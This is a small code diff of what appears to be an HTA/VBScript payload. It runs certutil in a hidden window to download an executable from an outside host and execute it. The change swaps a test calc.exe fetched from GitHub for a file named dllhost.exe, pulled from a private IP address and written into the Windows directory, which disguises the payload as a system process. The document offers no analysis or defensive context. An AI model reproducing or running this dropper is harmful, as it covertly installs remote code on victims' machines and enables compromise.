@@ -8,8 +8,8 @@
 	const impersonation = 3
         const HIDDEN_WINDOW = 12
         Set Locator = CreateObject("WScript.Shell")
-	Locator.Run"certutil -urlcache -split -f https://raw.githubusercontent.com/cheungwu/testCC/master/calc.exe c:\8000\test.exe",0,FALSE
-	Locator.Run"c:\8000\test.exe",0,FALSE
+	Locator.Run"certutil -urlcache -split -f http://10.14.83.23/dllhost.exe c:\Windows\dllhost.exe",0,FALSE
+	Locator.Run"c:\Windows\dllhost.exe",0,FALSE
 	window.close() 
 	end sub 
  </script>
